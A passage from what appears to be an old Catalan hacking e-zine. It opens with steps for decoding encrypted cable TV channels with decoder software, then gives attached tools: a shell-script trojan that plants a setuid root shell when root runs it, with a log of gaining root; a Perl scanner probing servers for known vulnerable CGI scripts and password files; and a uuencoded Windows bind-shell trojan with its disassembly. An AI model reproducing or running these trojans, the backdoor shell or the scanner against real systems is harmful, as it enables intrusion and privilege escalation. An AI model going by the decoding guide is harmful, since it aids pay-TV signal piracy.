    targeta, a vegades són utils, a vegades et lien més.

3.- Una vegada localitzats els canals, esborres de la llista els que no
    soni res o se senti molt malament.

4.- Els que et queden que es veuen malament (encriptats), pero se senten
    perfectament son el nostre objectiu.

5.- Tria un programa encriptat que t'interessi desencriptar, deixa'l en
    pantalla petita.

6.- Atenció, això és molt xorra però és molt important. TAPEU LA PANTALLA
    DEL CANAL AMB UNA CARPETA OBERTA DE WINDOWS, SI VOLEU AMB "Mi PC", tant
    és. D'aquesta forma els dos programes no es paralitzaran, sembla molt
    raro, pero és així.

7.- Copies el programa (CCD) al HD a cualsevol carpeta, l'executes.

8.- En el CCD, ves a Options, Configure Channels, i actives la casella
    "Use Channel selection", tanques i tornes a obrir el programa.

9.- Si tot ha anat bé es veurà una imatge movent-se freneticament per la
    pantalla. Amb els cursors del teclat proveu que es quedi quieta.

10.- L'única pega que té aquest programa, és que el bloqueix horitzontal
    no funciona del tot bé i has d'estar continuament movent els cursors
    de un costat cap a l'altre. S'haurà de provar la versió per linux que
    esta en el link de més avall ;-)

Si voleu veure captures, les teniu al fitxer zip on esta aquest article.

Salut i Happy decoding !

Cal destacar que a MENTA TV, molts canals estan SENSE CODIFICAR, així
que disfruteu-los ! En les captures, els no codificats són: MTV.jpg,
Raidue.jpg, RTP.jpg i Mural.jpg. Les altres estan descodificades amb el CCD.


Links interessants:

http://home.wanadoo.nl/~esnel/
   (Molta informació interessant sobre el CCD)

http://www.sector17.dhs.org/cabletv/
   (Cablecrypt decoder per linux)

http://www.tvcableboxes.com
   (Desencriptant la senyal amb Decoders modificats (xapant pasta))

http://disc.box.sk/wb/index.php3?did=blacksat
   (Forums satel·lit i cable)



                                         L'unica barrera ets tu.
                                           Només has d'apredre a saltar-te.

==============================================================================
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
==============================================================================
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
==============================================================================

$10$


           /
----------'    Fitxers adjunts

Després de tenir una kdd i xerrar sobre el tema hem decidit no omplir la
revista amb codis uuencodats, aixi ocuparà menys i si a algu li interessa
tenir els programes li facilitarem la URL.

1.- QUiCKSHOT ÚNIX troyan.
2.- CGI-SCAN.PL - scanejador de cgi's per Linux escrit amb Perl.
3.- Tini troyan - Troyano per w32 escrit en asm - no es queda permanent.
4.- Col·lecció d'exploits pel RedHat6.2 - Acastan.


--[1]----[ QUiCKSHOT ÚNIX TROYAN ]--------------------------------------------

#!/bin/sh
#  //////////////////////////////////
#  /  QUiCKSHOT troianet, BPAP '99  /
#  //////////////////////////////////
# 
# Requeriments:
#
#   -Conta d'usuari (tot i ke es podria arreglar per mail, suposo)
#   -L'execució de l'arxiu per part d'algu amb mes poder (menys UID)
#	que nosaltres, per exemple el root.
#   -Permis d'escriptura al directori on volem ke se'ns copii la shell
#    (per exemple a /home/cathack) 
#	 chmod o+w /home/cathack/
#
# Variables:
#
#     $UID = User ID, els users normals 500, el root 0
#     $0 = Programa ke estem executant
#     $ubicacio = path on volem ke es gravi la shell.
#
# Akest script en shell es, suposo, el troia mes senzill ke hi 
# ha, la gracia esta en fer-lo executar al root, ja sigui per mail
# o d'una altra manera.

# Variable del directori on es grava la shell
# sense barra al final

$ubicacio = "/home/cathack"    

cp /bin/bash $ubicacio/$UID      # Copia la shell al nostre dir.
chmod 4000 $ubicacio/$UID        # Traspassa els permisos de ki executa
                                 # l'arxiu a l'arxiu en si 
chmod ugo+x $ubicacio/$UID       # Dona permis d'execucio a qualsevol 

# echos a la pantalla

echo "Aixo es un troianet ke copia la shell al directori"
echo "$ubicacio amb el nom del numero ke identifica a cada"
echo "usuari (UID)"
echo "Substituiu aixo per algo mes discret :) o camufleu-ho en algun programa en C"
echo " "
echo " QUiCKSHOT, BPAP 99 "

# S'autoesborra, pero crec ke no funciona ja ke no es pot borrar mentre
# s'executa:
# rm $0 

# A partir d'ara podrem executar l'arxiu de la nostra conta i ens
# convertirem en l'usuari ke ha caigut a la trampa. A mes veurem 
# kina UID te la victima, si es el root veurem un arxiu ke es dira
# 0. Nomes hem de fer ./0 per ser root. 


------[ log ]--------
//  comentaris:
// em faig root per comprovar si funciona i executo el troia
// torno com a usuari cathack i executo l'arxiu ke s'ha creat
// al directori cathack amb el nom de la UID del root (0)
// Executant l'arxiu 0 com a cathack obtenim r00t! :)

bash$ su
Password: (********)

[root@1b2_6 cathack]# ls
-l     POOOOOOOOP   cat          gdm.c  nc
500    Ricardo.jpg  dead.letter  mail   pgb.txt
KL4RK  adeu.txt     ed.hup       mbox   portsoberts.txt

[root@1b2_6 cathack]# cd cat
[root@1b2_6 cat]# ls
cathack
[root@1b2_6 cat]# ./cathack
sh: Eps!: command not found
Quicky, BPAP
[root@1b2_6 cat]# cd ..
[root@1b2_6 cathack]# ls    // observeu com ara hi ha l'arxiu 0 !!
-l  500    POOOOOOOOP   adeu.txt  dead.letter  gdm.c  mbox  pgb.txt
0   KL4RK  Ricardo.jpg  cat       ed.hup       mail   nc    portsoberts.txt

[root@1b2_6 cathack]# exit
exit
bash$ whoami
cathack
bash$ ls
-l  500    POOOOOOOOP   adeu.txt  dead.letter  gdm.c  mbox  pgb.txt
0   KL4RK  Ricardo.jpg  cat       ed.hup       mail   nc    portsoberts.txt
bash$ ./0
bash# whoami
root
bash# ueueuueueueeiiiiiiiii

// i ja tenim suid!  

--[1]----[ QUiCKSHOT ÚNIX TROYAN ]--------------------------------------------



--[2]----[ CGI-SCAN.PL ]------------------------------------------------------

      #!/usr/bin/perl
      ##############################################
      #                                            #
      # CGI scanner in perl                        #
      # Written By: Epicurus (epicurus@wilter.com) #
      #                                            #
      # Based on a C version by su1d sh3ll         #
      #                                            #
      ##############################################
      #
      # Hem actualitzat la llista per incloure el bug de whois.cgi i whois_raw.cgi
      
      use Socket;
      
      @cgi_scripts = ("GET /cgi-bin/rwwwshell.pl HTTP/1.0\n\n","GET /cgi-bin/phf HTTP/1.0\n\n",
      "GET /cgi-bin/Count.cgi HTTP/1.0\n\n","GET /cgi-bin/test-cgi HTTP/1.0\n\n",
      "GET /cgi-bin/nph-test-cgi HTTP/1.0\n\n","GET /cgi-bin/nph-publish HTTP/1.0\n\n",
      "GET /cgi-bin/php.cgi HTTP/1.0\n\n","GET /cgi-bin/handler HTTP/1.0\n\n",
      "GET /cgi-bin/webgais HTTP/1.0\n\n","GET /cgi-bin/websendmail HTTP/1.0\n\n",
      "GET /cgi-bin/webdist.cgi HTTP/1.0\n\n","GET /cgi-bin/faxsurvey HTTP/1.0\n\n",
      "GET /cgi-bin/htmlscript HTTP/1.0\n\n","GET /cgi-bin/pfdispaly.cgi HTTP/1.0\n\n",
      "GET /cgi-bin/perl.exe HTTP/1.0\n\n","GET /cgi-bin/wwwboard.pl HTTP/1.0\n\n",
      "GET /cgi-bin/www-sql HTTP/1.0\n\n","GET /cgi-bin/view-source HTTP/1.0\n\n",
      "GET /cgi-bin/campas HTTP/1.0\n\n","GET /cgi-bin/aglimpse HTTP/1.0\n\n",
      "GET /cgi-bin/glimpse HTTP/1.0\n\n","GET /cgi-bin/man.sh HTTP/1.0\n\n",
      "GET /cgi-bin/AT-admin.cgi HTTP/1.0\n\n","GET /cgi-bin/filemail.pl HTTP/1.0\n\n",
      "GET /cgi-bin/maillist.pl HTTP/1.0\n\n","GET /cgi-bin/jj HTTP/1.0\n\n",
      "GET /cgi-bin/info2www HTTP/1.0\n\n","GET /cgi-bin/files.pl HTTP/1.0\n\n",
      "GET /cgi-bin/finger HTTP/1.0\n\n","GET /cgi-bin/bnbform.cgi HTTP/1.0\n\n",
      "GET /cgi-bin/survey.cgi HTTP/1.0\n\n","GET /cgi-bin/AnyForm2 HTTP/1.0\n\n",
      "GET /cgi-bin/textcounter.pl HTTP/1.0\n\n","GET /cgi-bin/classifieds.cgi HTTP/1.0\n\n",
      "GET /cgi-bin/environ.cgi HTTP/1.0\n\n","GET /cgi-bin/wrap HTTP/1.0\n\n",
      "GET /cgi-bin/cgiwrap HTTP/1.0\n\n","GET /cgi-bin/guestbook.cgi HTTP/1.0\n\n",
      "GET /cgi-bin/edit.pl HTTP/1.0\n\n","GET /cgi-bin/perlshop.cgi HTTP/1.0\n\n",
      "GET /cgi-bin/whois.cgi HTTP/1.0\n\n,"GET /cgi-bin/whois_raw.cgi HTTP/1.0\n\n",
      "GET /_vti_inf.html HTTP/1.0\n\n","GET /_vti_pvt/service.pwd HTTP/1.0\n\n",
      "GET /_vti_pvt/users.pwd HTTP/1.0\n\n","GET /_vti_pvt/authors.pwd HTTP/1.0\n\n",
      "GET /_vti_pvt/administrators.pwd HTTP/1.0\n\n","GET /_vti_bin/shtml.dll HTTP/1.0\n\n",
      "GET /_vti_bin/shtml.exe HTTP/1.0\n\n","GET /cgi-dos/args.bat HTTP/1.0\n\n",
      "GET /cgi-win/uploader.exe HTTP/1.0\n\n","GET /cgi-bin/rguest.exe HTTP/1.0\n\n",
      "GET /cgi-bin/wguest.exe HTTP/1.0\n\n","GET /scripts/issadmin/bdir.htr HTTP/1.0\n\n",
      "GET /scripts/CGImail.exe HTTP/1.0\n\n","GET /scripts/tools/newdsn.exe HTTP/1.0\n\n",
      "GET /scripts/fpcount.exe HTTP/1.0\n\n","GET /cfdocs/expelval/openfile.cfm HTTP/1.0\n\n",
      "GET /cfdocs/expelval/exprcalc.cfm HTTP/1.0\n\n","GET /cfdocs/expelval/displayopenedfile.cfm HTTP/1.0\n\n",
      "GET /cfdocs/expelval/sendmail.cfm HTTP/1.0\n\n","GET /iissamples/exair/howitworks/codebrws.asp HTTP/1.0\n\n",
      "GET /iissamples/sdk/asp/docs/codebrws.asp HTTP/1.0\n\n","GET /msads/Samples/SELECTOR/showcode.asp HTTP/1.0\n\n",
      "GET /search97.vts HTTP/1.0\n\n","GET /carbo.dll HTTP/1.0\n\n"
      );
      
      @cgi_names = ("THC - backdoor  ","phf             ","Count.cgi       ","test-cgi        ","nph-test-cgi    ",
      "nph-publish     ","php.cgi         ","handler         ","webgais         ","websendmail     ",
      "webdist.cgi     ","faxsurvey       ","htmlscript      ","pfdisplay       ","perl.exe        ",
      "wwwboard.pl     ","www-sql         ","view-source     ","campas          ","aglimpse        ",
      "glimpse         ","man.sh          ","AT-admin.cgi    ","filemail.pl     ","maillist.pl     ",
      "jj              ","info2www        ","files.pl        ","finger          ","bnbform.cgi     ",
      "survey.cgi      ","AnyForm2        ","textcounter.pl  ","classifields.cgi","environ.cgi     ",
      "wrap            ","cgiwrap         ","guestbook.cgi   ","edit.pl         ","perlshop.cgi    ",
      "whois.cgi       ","whois_raw.cgi   ",
      "_vti_inf.html   ","service.pwd     ","users.pwd       ","authors.pwd     ","administrators  ",
      "shtml.dll       ","shtml.exe       ","args.bat        ","uploader.exe    ","rguest.exe      ",
      "wguest.exe      ","bdir - samples  ","CGImail.exe     ","newdsn.exe      ","fpcount.exe     ",
      "openfile.cfm    ","exprcalc.cfm    ","dispopenedfile  ","sendmail.cfm    ","codebrws.asp    ",
      "codebrws.asp 2  ","showcode.asp    ","search97.vts    ","carbo.dll       ");
      
      
      print "CGI scanner [in Perl] v1.0\n\n";
      print "Host: ";
      chomp($remote=<STDIN>);
      
      print "HTTP Port [80]: ";
      chomp($port=<STDIN>);
      
      if($port eq "")
      {
              $port=80;
      }
      
      print "Log Session?(y/n)";
      $yn=<STDIN>;
      
      if($yn =~ /y/i)
      { 
              $log = 1; 
              $logfile="$remote".".scan";
      
              print "Log File [$logfile]: ";
              $file=<STDIN>;
              chop($file) if $file =~ /\n$/;
      
              if($file ne "") 
              {
                      $logfile=$file;
              }
              open(LOG,">>$logfile") || die("Unable to write to $logfile!");
              print LOG "Scanning $remote port $port\n\n";
      }
      
      print "Press [enter] to check the httpd version...\n";
      $blah=<STDIN>;
      
      $submit = "HEAD / HTTP/1.0\r\n\r\n";
      if($port =~ /\D/) { $port = getservbyname($port, 'tcp') }
      &error("No port specified.") unless $port;
      $iaddr = inet_aton($remote) || &error("Failed to find host: $remote");
      $paddr = sockaddr_in($port, $iaddr) || &error("Some fucking thing!");
      $proto = getprotobyname('tcp') || &error("Unable to get protocall!");
      
      socket(SOCK, PF_INET, SOCK_STREAM, $proto) || &error("Failed to open socket: $!");
      connect(SOCK, $paddr) || &error("Unable to connect: $!");
      send(SOCK,$submit,0);
      while(<SOCK>)
      {
              print $_;
              print LOG $_ if $log==1;
      }
      close(SOCK);
      
      print "Press [enter] to check for CGI vulnerabilities...\n";
      $blah=<STDIN>;
      
      $i=0;
      
      foreach $cgi_script(@cgi_scripts)
      {
              print "Searching for @cgi_names[$i] : ";
              print LOG "Searching for @cgi_names[$i] : " if $log==1;
              $submit=$cgi_script;
              &connect_n_check;
              $i++;
      }
      
      if($bad_security>0)
      {
              print "Server may have CGI vulnerabilities.\n";
              print LOG "Server may have CGI vulnerabilities.\n\n" if $log==1;
      }
      else
      {
              print "No known CGI vulnerabilities found.\n";
              print LOG "No known CGI vulnerabilities found.\n\n" if $log==1;
      }
      close(LOG) if $log==1;
      exit;
      
      sub connect_n_check
      {
              if($port =~ /\D/) { $port = getservbyname($port, 'tcp') }
              &error("No port specified.") unless $port;
              $iaddr = inet_aton($remote) || &error("Failed to find host: $remote");
              $paddr = sockaddr_in($port, $iaddr) || &error("Some fucking thing!");
              $proto = getprotobyname('tcp') || &error("Unable to get protocall!");
      
              socket(SOCK, PF_INET, SOCK_STREAM, $proto) || &error("Failed to open socket: $!");
              connect(SOCK, $paddr) || &error("Unable to connect: $!");
              send(SOCK,$submit,0);
      
              $check=<SOCK>;
              ($http,$code,$blah) = split(/ /,$check);
              if($code == 200)
              {
                      print "Found!\n";
                      print LOG "Found!\n" if $log==1;
                      $bad_security++;
              }
              else
              {
                      print "Not Found\n";
                      print LOG "Not Found\n" if $log==1;
              }
              close(SOCK);
      }
      
      sub error
      {
      $error = shift(@_);
              print "Error - $error\n";
              print LOG "Error - $error\n\n" if $log==1;
              close(LOG) if $log==1;
              exit;
      }

--[2]----[ CGI-SCAN.PL ]------------------------------------------------------


--[3]----[ TINI.UUE ]---------------------------------------------------------
begin 666 tini.zip
M4$L#!!0````(`/M^-BEV!+5S5P,````,```(````=&EN:2YE>&7M54UH$U$0
MGDVS$FNJJ1:L8O556A214+<J"A6VVE6A54-;6Q`$UV3U)31)2;;2@TA0!'\0
M!#UX\&!;$5$/'L1&Z:%J,5I4>A3LH0>%!7/(04&D$F?>;M(4L3V(E]))YN^;
M>3-OWNYC#QV[#F4`X$;.YP'28),*\]-CY.4;GB^')TO?UZ:EMO>UG3R<9+V)
M^.F$'F5!/1:+F^RDP1)],1:.L98C'2P:#QG^BHKR.J?&\=4UG]:<25XJY7+D
M+UWZI6K4[>$@)ZS0,Z`!M$EE<.O1D]T%;`I62,LDV2N&&'=`G\.,'-6V7?:<
M1`4-(!4=5V&AKU07E2"5`33!?R`V]YG[3:/?1)VC3=*&W%`ZA"`&<,*?".FF
M#K!3L@$QE&=VGHI_OYT&FU^C:'#RRO_(&X5%6M#$JQI4X!*^+=8PO@*1)1$I
MXK(FT!P:W*;"J8Q\#Y4+,O(#U$0(W4=SO1[Q<8KE=U"B=9%6RXYS#AUE=/`I
MVH/#*-(/*['+&[0B^`N0L+9@3KI^)>+O9N$K$><_L9&U%JT[5.-*#179^*H)
MS"\9^2/:+1C/R)/.EC+R5-'Z7+3<B@HT&&ZX7%$%Y%7LX,`H9@WYT!L8(ZL*
MK:%J1<SK<7)O?E?A)IT0&=9Y+'1ASUTT77UU?!WF\(_.MO$GD>300(#5BJE?
M-_XEQV/G;)*H11.FT%WF9/"M2O$P%0P/J02*@ZBDBA-'KV8OC&4SVC<O[4_[
M(:;4INFB1^":]BW`1W`MI]&L%PB^ENGL)+O$!Y'%[^.=Y]D;U(C*6Y\0OJSE
M:'TVD._+.3$J9`U@[.N+MR_=(#KGYNI,I\C3M.J`Z#P\T[G3R<H%[.XM8DR1
MVRA"U-8&Q98.4]LQ:INOKV8(UX.0;B$]0GJ%]`E9)203LD[(S4)N%;)!R.U"
M[F+VTU^D&1IG`)/(6>1I9$\M?EZ01Y@=3P*D\#FG\"JF*I#Q=4VM0EZ-3/&S
M;*;6.EQ'WYS;)=@6Q%B)7TK_VKL9]B4,W30"X5X#8&_!2\2#1C+9#'#003HY
MJA!^'*4#AMEE))+A>$SK;X9?4COB^\,]N#KIZN@QC%YXYNI.A$U#@*U:^V&M
MK5'QAWIZ`+H[CNQK+3@+AH+1D-_H-R`8CT;U6,B/>OY%B[1@Z#=02P$"%``4
M````"`#[?C8I=@2U<U<#````#```"````````````"``_X$`````=&EN:2YE
8>&502P4&``````$``0`V````?0,`````
`
end
--[3]----[ TINI.UUE ]---------------------------------------------------------

--[3]----[ TINI.DASM ]-------[ tini.exe desensamblat amb el Dasm ]------------
Disassembly of File: tini.exe
Code Offset = 00000400, Code Size = 00000400
Data Offset = 00000A00, Data Size = 00000200

Number of Objects = 0003 (dec), Imagebase = 00400000h

   Object01: .text    RVA: 00001000 Offset: 00000400 Size: 00000400 Flags: 60000020
   Object02: .rdata   RVA: 00002000 Offset: 00000800 Size: 00000200 Flags: 40000040
   Object03: .data    RVA: 00003000 Offset: 00000A00 Size: 00000200 Flags: C0000040


+++++++++++++++++++ MENU INFORMATION ++++++++++++++++++

        There Are No Menu Resources in This Application

+++++++++++++++++ DIALOG INFORMATION ++++++++++++++++++

        There Are No Dialog Resources in This Application

+++++++++++++++++++ IMPORTED FUNCTIONS ++++++++++++++++++
Number of Imported Modules =    2 (decimal)

   Import Module 001: KERNEL32.dll
   Import Module 002: WSOCK32.dll

+++++++++++++++++++ IMPORT MODULE DETAILS +++++++++++++++

   Import Module 001: KERNEL32.dll

 Addr:000020CA hint(0042) Name: CreateProcessA
 Addr:000020DC hint(0048) Name: CreateThread
 Addr:000020EC hint(0160) Name: GetVersionExA
 Addr:000020FC hint(01FD) Name: ReadFile
 Addr:00002108 hint(0273) Name: Sleep
 Addr:00002110 hint(02B9) Name: WriteFile
 Addr:000020BC hint(0041) Name: CreatePipe

   Import Module 002: WSOCK32.dll

 Addr:80000073 hint(0073) Name: WSAStartup
 Addr:80000001 hint(0001) Name: accept
 Addr:80000002 hint(0002) Name: bind
 Addr:8000000D hint(000D) Name: listen
 Addr:80000010 hint(0010) Name: recv
 Addr:80000013 hint(0013) Name: send
 Addr:80000017 hint(0017) Name: socket

+++++++++++++++++++ EXPORTED FUNCTIONS ++++++++++++++++++
Number of Exported Functions = 0000 (decimal)




+++++++++++++++++++ ASSEMBLY CODE LISTING ++++++++++++++++++
//********************** Start of Code in Object .text **************
Program Entry Point = 00401000 (tini.exe File Offset:00001800)



//******************** Program Entry Point ********
:00401000 6814304000              push 00403014
:00401005 6801010000              push 00000101

* Reference To: WSOCK32.WSAStartup, Ord:0073h
                                  |
:0040100A E8B7020000              Call 004012C6
:0040100F 6A06                    push 00000006
:00401011 6A01                    push 00000001
:00401013 6A02                    push 00000002

* Reference To: WSOCK32.socket, Ord:0017h
                                  |
:00401015 E8D0020000              Call 004012EA
:0040101A A3A2314000              mov dword ptr [004031A2], eax
:0040101F 66C705A63140000200      mov word ptr [004031A6], 0002
:00401028 C705AA31400000000000    mov dword ptr [004031AA], 00000000
:00401032 66C705A83140001E61      mov word ptr [004031A8], 611E
:0040103B 6A10                    push 00000010
:0040103D 68A6314000              push 004031A6
:00401042 FF35A2314000            push dword ptr [004031A2]

* Reference To: WSOCK32.bind, Ord:0002h
                                  |
:00401048 E885020000              Call 004012D2
:0040104D 6A05                    push 00000005
:0040104F FF35A2314000            push dword ptr [004031A2]

* Reference To: WSOCK32.listen, Ord:000Dh
                                  |
:00401055 E87E020000              Call 004012D8
:0040105A 32C0                    xor al, al
:0040105C A2B6314000              mov byte ptr [004031B6], al
:00401061 A2B7314000              mov byte ptr [004031B7], al
:00401066 B8AB114000              mov eax, 004011AB
:0040106B 68C8314000              push 004031C8
:00401070 6A00                    push 00000000
:00401072 6A00                    push 00000000
:00401074 50                      push eax
:00401075 6A00                    push 00000000
:00401077 6A00                    push 00000000

* Reference To: KERNEL32.CreateThread, Ord:0048h
                                  |
:00401079 E82A020000              Call 004012A8
:0040107E B825124000              mov eax, 00401225
:00401083 68CC314000              push 004031CC
:00401088 6A00                    push 00000000
:0040108A 6A00                    push 00000000
:0040108C 50                      push eax
:0040108D 6A00                    push 00000000
:0040108F 6A00                    push 00000000

* Reference To: KERNEL32.CreateThread, Ord:0048h
                                  |
:00401091 E812020000              Call 004012A8

* Referenced by a (U)nconditional or (C)onditional Jump at Address:
|:004010AF(C)
|
:00401096 68FA000000              push 000000FA

* Reference To: KERNEL32.Sleep, Ord:0273h
                                  |
:0040109B E81A020000              Call 004012BA
:004010A0 A0B6314000              mov al, byte ptr [004031B6]
:004010A5 8A1DB7314000            mov bl, byte ptr [004031B7]
:004010AB 22C3                    and al, bl
:004010AD 3C00                    cmp al, 00
:004010AF 74E5                    je 00401096
:004010B1 C705D831400044000000    mov dword ptr [004031D8], 00000044
:004010BB C705DC31400000000000    mov dword ptr [004031DC], 00000000
:004010C5 C705E031400000000000    mov dword ptr [004031E0], 00000000
:004010CF C705E431400000000000    mov dword ptr [004031E4], 00000000
:004010D9 C7050432400001010000    mov dword ptr [00403204], 00000101
:004010E3 66C7050A3240000000      mov word ptr [0040320A], 0000
:004010EC C7050C32400000000000    mov dword ptr [0040320C], 00000000
:004010F6 A1C0314000              mov eax, dword ptr [004031C0]
:004010FB A310324000              mov dword ptr [00403210], eax
:00401100 A1C4314000              mov eax, dword ptr [004031C4]
:00401105 A314324000              mov dword ptr [00403214], eax
:0040110A A318324000              mov dword ptr [00403218], eax
:0040110F 66C705083240000000      mov word ptr [00403208], 0000
:00401118 C70594F5400094000000    mov dword ptr [0040F594], 00000094
:00401122 6894F54000              push 0040F594

* Reference To: KERNEL32.GetVersionExA, Ord:0160h
                                  |
:00401127 E882010000              Call 004012AE
:0040112C 833DA4F5400002          cmp dword ptr [0040F5A4], 00000002
:00401133 7524                    jne 00401159
:00401135 681C324000              push 0040321C
:0040113A 68D8314000              push 004031D8
:0040113F 6A00                    push 00000000
:00401141 6A00                    push 00000000
:00401143 6A00                    push 00000000
:00401145 6A01                    push 00000001
:00401147 6A00                    push 00000000
:00401149 6A00                    push 00000000

* Possible StringData Ref from Data Obj ->"cmd.exe"
                                  |
:0040114B 6800304000              push 00403000
:00401150 6A00                    push 00000000

* Reference To: KERNEL32.CreateProcessA, Ord:0042h
                                  |
:00401152 E84B010000              Call 004012A2
:00401157 EB22                    jmp 0040117B

* Referenced by a (U)nconditional or (C)onditional Jump at Address:
|:00401133(C)
|
:00401159 681C324000              push 0040321C
:0040115E 68D8314000              push 004031D8
:00401163 6A00                    push 00000000
:00401165 6A00                    push 00000000
:00401167 6A00                    push 00000000
:00401169 6A01                    push 00000001
:0040116B 6A00                    push 00000000
:0040116D 6A00                    push 00000000

* Possible StringData Ref from Data Obj ->"command.com"
                                  |
:0040116F 6808304000              push 00403008
:00401174 6A00                    push 00000000

* Reference To: KERNEL32.CreateProcessA, Ord:0042h
                                  |
:00401176 E827010000              Call 004012A2

* Referenced by a (U)nconditional or (C)onditional Jump at Addresses:
|:00401157(U), :004011A9(U)
|
:0040117B C7053C32400010000000    mov dword ptr [0040323C], 00000010
:00401185 683C324000              push 0040323C
:0040118A 682C324000              push 0040322C
:0040118F FF35A2314000            push dword ptr [004031A2]

* Reference To: WSOCK32.accept, Ord:0001h
                                  |
:00401195 E832010000              Call 004012CC
:0040119A A340324000              mov dword ptr [00403240], eax
:0040119F 68FA000000              push 000000FA

* Reference To: KERNEL32.Sleep, Ord:0273h
                                  |
:004011A4 E811010000              Call 004012BA
:004011A9 EBD0                    jmp 0040117B
:004011AB 55                      push ebp
:004011AC 8BEC                    mov ebp, esp
:004011AE 83C4EC                  add esp, FFFFFFEC
:004011B1 C745F40C000000          mov [ebp-0C], 0000000C
:004011B8 C745F800000000          mov [ebp-08], 00000000
:004011BF C745FC01000000          mov [ebp-04], 00000001
:004011C6 6A00                    push 00000000
:004011C8 8D45F4                  lea eax, dword ptr [ebp-0C]
:004011CB 50                      push eax
:004011CC 68BC314000              push 004031BC
:004011D1 68C0314000              push 004031C0

* Reference To: KERNEL32.CreatePipe, Ord:0041h
                                  |
:004011D6 E8C1000000              Call 0040129C
:004011DB C605B631400001          mov byte ptr [004031B6], 01

* Referenced by a (U)nconditional or (C)onditional Jump at Address:
|:0040121F(U)
|
:004011E2 68FA000000              push 000000FA

* Reference To: KERNEL32.Sleep, Ord:0273h
                                  |
:004011E7 E8CE000000              Call 004012BA
:004011EC 6A00                    push 00000000
:004011EE 68A8610000              push 000061A8
:004011F3 68EC934000              push 004093EC
:004011F8 FF3540324000            push dword ptr [00403240]

* Reference To: WSOCK32.recv, Ord:0010h
                                  |
:004011FE E8DB000000              Call 004012DE
:00401203 8945F0                  mov dword ptr [ebp-10], eax
:00401206 6A00                    push 00000000
:00401208 8D45EC                  lea eax, dword ptr [ebp-14]
:0040120B 50                      push eax
:0040120C FF75F0                  push [ebp-10]
:0040120F 68EC934000              push 004093EC
:00401214 FF35BC314000            push dword ptr [004031BC]

* Reference To: KERNEL32.WriteFile, Ord:02B9h
                                  |
:0040121A E8A1000000              Call 004012C0
:0040121F EBC1                    jmp 004011E2
:00401221 C9                      leave
:00401222 C20400                  ret 0004


:00401225 55                      push ebp
:00401226 8BEC                    mov ebp, esp
:00401228 83C4F0                  add esp, FFFFFFF0
:0040122B C745F40C000000          mov [ebp-0C], 0000000C
:00401232 C745F800000000          mov [ebp-08], 00000000
:00401239 C745FC01000000          mov [ebp-04], 00000001
:00401240 6A00                    push 00000000
:00401242 8D45F4                  lea eax, dword ptr [ebp-0C]
:00401245 50                      push eax
:00401246 68C4314000              push 004031C4
:0040124B 68B8314000              push 004031B8

* Reference To: KERNEL32.CreatePipe, Ord:0041h
                                  |
:00401250 E847000000              Call 0040129C
:00401255 C605B731400001          mov byte ptr [004031B7], 01

* Referenced by a (U)nconditional or (C)onditional Jump at Address:
|:00401296(U)
|
:0040125C 68FA000000              push 000000FA

* Reference To: KERNEL32.Sleep, Ord:0273h
                                  |
:00401261 E854000000              Call 004012BA
:00401266 6A00                    push 00000000
:00401268 8D45F0                  lea eax, dword ptr [ebp-10]
:0040126B 50                      push eax
:0040126C 68A8610000              push 000061A8
:00401271 6844324000              push 00403244
:00401276 FF35B8314000            push dword ptr [004031B8]

* Reference To: KERNEL32.ReadFile, Ord:01FDh
                                  |
:0040127C E833000000              Call 004012B4
:00401281 6A00                    push 00000000
:00401283 FF75F0                  push [ebp-10]
:00401286 6844324000              push 00403244
:0040128B FF3540324000            push dword ptr [00403240]

* Reference To: WSOCK32.send, Ord:0013h
                                  |
:00401291 E84E000000              Call 004012E4
:00401296 EBC4                    jmp 0040125C
:00401298 C9                      leave
:00401299 C20400                  ret 0004



* Referenced by a CALL at Addresses:
|:004011D6   , :00401250   
|

* Reference To: KERNEL32.CreatePipe, Ord:0041h
                                  |
:0040129C FF2518204000            Jmp dword ptr [00402018]

* Referenced by a CALL at Addresses:
|:00401152   , :00401176   
|

* Reference To: KERNEL32.CreateProcessA, Ord:0042h
                                  |
:004012A2 FF2500204000            Jmp dword ptr [00402000]

* Referenced by a CALL at Addresses:
|:00401079   , :00401091   
|

* Reference To: KERNEL32.CreateThread, Ord:0048h
                                  |
:004012A8 FF2504204000            Jmp dword ptr [00402004]

* Referenced by a CALL at Address:
|:00401127   
|

* Reference To: KERNEL32.GetVersionExA, Ord:0160h
                                  |
:004012AE FF2508204000            Jmp dword ptr [00402008]

* Referenced by a CALL at Address:
|:0040127C   
|

* Reference To: KERNEL32.ReadFile, Ord:01FDh
                                  |
:004012B4 FF250C204000            Jmp dword ptr [0040200C]

* Referenced by a CALL at Addresses:
|:0040109B   , :004011A4   , :004011E7   , :00401261   
|

* Reference To: KERNEL32.Sleep, Ord:0273h
                                  |
:004012BA FF2510204000            Jmp dword ptr [00402010]

* Referenced by a CALL at Address:
|:0040121A   
|

* Reference To: KERNEL32.WriteFile, Ord:02B9h
                                  |
:004012C0 FF2514204000            Jmp dword ptr [00402014]

* Referenced by a CALL at Address:
|:0040100A   
|

* Reference To: WSOCK32.WSAStartup, Ord:0073h
                                  |
:004012C6 FF2520204000            Jmp dword ptr [00402020]

* Referenced by a CALL at Address:
|:00401195   
|

* Reference To: WSOCK32.accept, Ord:0001h
                                  |
:004012CC FF2524204000            Jmp dword ptr [00402024]

* Referenced by a CALL at Address:
|:00401048   
|

* Reference To: WSOCK32.bind, Ord:0002h
                                  |
:004012D2 FF2528204000            Jmp dword ptr [00402028]

* Referenced by a CALL at Address:
|:00401055   
|

* Reference To: WSOCK32.listen, Ord:000Dh
                                  |
:004012D8 FF252C204000            Jmp dword ptr [0040202C]

* Referenced by a CALL at Address:
|:004011FE   
|

* Reference To: WSOCK32.recv, Ord:0010h
                                  |
:004012DE FF2530204000            Jmp dword ptr [00402030]

* Referenced by a CALL at Address:
|:00401291   
|

* Reference To: WSOCK32.send, Ord:0013h
                                  |
:004012E4 FF2534204000            Jmp dword ptr [00402034]

* Reference To: WSOCK32.socket, Ord:0017h
                                  |
:004012EA FF2538204000            Jmp dword ptr [00402038]
:004012F0 00000000000000000000    BYTE 10 DUP(0)
:004012FA 00000000000000000000    BYTE 10 DUP(0)
:00401304 00000000000000000000    BYTE 10 DUP(0)
:0040130E 00000000000000000000    BYTE 10 DUP(0)
:00401318 00000000000000000000    BYTE 10 DUP(0)
:00401322 00000000000000000000    BYTE 10 DUP(0)
